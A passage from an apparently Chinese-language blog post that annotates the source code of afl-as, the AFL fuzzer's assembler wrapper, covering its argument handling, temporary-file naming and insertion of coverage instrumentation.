class="line"></span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> tv;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timezone</span> tz;</span><br><span class="line"></span><br><span class="line">  clang_mode = !!<span class="built_in">getenv</span>(CLANG_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);  <span class="comment">//获得当前系统时间</span></span><br><span class="line"></span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>();  <span class="comment">//种子</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">srandom</span>(rand_seed);  <span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(AS_LOOP_ENV_VAR))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setenv</span>(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || <span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;</span><br><span class="line">    inst_ratio /= <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!just_version) <span class="built_in">add_instrumentation</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">execvp</span>(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) <span class="built_in">unlink</span>(modified_file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit_params(argc, argv);</span><br></pre></td></tr></table></figure><p>功能：</p><ul><li><p>解析命令行参数，准备传递给真实汇编器的参数</p></li><li><p>检测目标架构（32位&#x2F;64位）</p></li><li><p>处理 macOS 特殊情况（使用 clang 而不是 as）</p></li><li><p>确定临时文件路径</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8 *tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_AS&quot;</span>);</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span></span><br><span class="line"><span class="comment">     is not set. We need to check these non-standard variables to properly</span></span><br><span class="line"><span class="comment">     handle the pass_thru logic later on. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">32</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = argv[i];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;</span><br><span class="line">      just_version = <span class="number">1</span>;</span><br><span class="line">      modified_file = input_file;</span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) <span class="built_in">FATAL</span>(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if this looks like a standard invocation as a part of an attempt</span></span><br><span class="line"><span class="comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span></span><br><span class="line"><span class="comment">       a format we may not understand. This works around an issue compiling</span></span><br><span class="line"><span class="comment">       NSS. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified_file = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, <span class="built_in">getpid</span>(),</span><br><span class="line">                               (u32)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">wrap_things_up:</span><br><span class="line"></span><br><span class="line">  as_params[as_par_cnt++] = modified_file;</span><br><span class="line">  as_params[as_par_cnt]   = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>环境变量<code>TEMP</code>和<code>TMP</code>的使用均需要用户在执行<code>afl-as</code>前手动设置，如果均不存在则默认设置<code>tmp_dir</code>变量为<code>/tmp</code>目录</p><p>生成临时文件名：<code>/tmp/.afl-&lt;pid&gt;-&lt;timestamp&gt;.s</code></p><h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><p>以下是核心数据结构：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8 line[MAX_LINE];           <span class="comment">// 读取每行汇编代码的缓冲区</span></span><br><span class="line">FILE* inf;                          <span class="comment">// 输入文件指针</span></span><br><span class="line">FILE* outf;                         <span class="comment">// 输出文件指针</span></span><br><span class="line">s32 outfd;                          <span class="comment">// 输出文件描述符</span></span><br><span class="line">u32 ins_lines = <span class="number">0</span>;                  <span class="comment">// 插桩行数计数器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制标志</span></span><br><span class="line">u8  instr_ok = <span class="number">0</span>,                   <span class="comment">// 是否在可插桩区域(.text段)</span></span><br><span class="line">    skip_csect = <span class="number">0</span>,                 <span class="comment">// 跳过代码段(架构不匹配)</span></span><br><span class="line">    skip_next_label = <span class="number">0</span>,            <span class="comment">// 跳过下一个标签</span></span><br><span class="line">    skip_intel = <span class="number">0</span>,                 <span class="comment">// 跳过Intel语法块</span></span><br><span class="line">    skip_app = <span class="number">0</span>,                   <span class="comment">// 跳过内联汇编块</span></span><br><span class="line">    instrument_next = <span class="number">0</span>;            <span class="comment">// 标记下一条指令需要插桩</span></span><br></pre></td></tr></table></figure><p>插桩注入，这是程序的核心函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process input file, generate modified_file. Insert instrumentation in all</span></span><br><span class="line"><span class="comment">   the appropriate places. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">add_instrumentation</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line"></span><br><span class="line">    inf = fopen(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!inf) PFATAL(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = <span class="built_in">stdin</span>;</span><br><span class="line"></span><br><span class="line">  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line"></span><br><span class="line">  outf = fdopen(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!outf) PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the actual line, call it a day in pass-thru mode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">         around them, so we use that as a signal. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class="line"><span class="comment">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class="line"><span class="comment">       seen, and we do not instrument. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class="line"><span class="comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class="line"><span class="comment">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class="line"><span class="comment">       we want to catch:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^main:      - function entry point (always instrumented)</span></span><br><span class="line"><span class="comment">         ^.L0:       - GCC branch label</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class="line"><span class="comment">         ^\tjnz foo  - conditional branches</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...but not:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^# BB#0:    - clang comments</span></span><br><span class="line"><span class="comment">         ^ # BB#0:   - ditto</span></span><br><span class="line"><span class="comment">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LC0       - GCC non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class="line"><span class="comment">         ^\tjmp foo  - non-conditional jumps</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class="line"><span class="comment">       with no leading dots on labels, hence the weird maze of 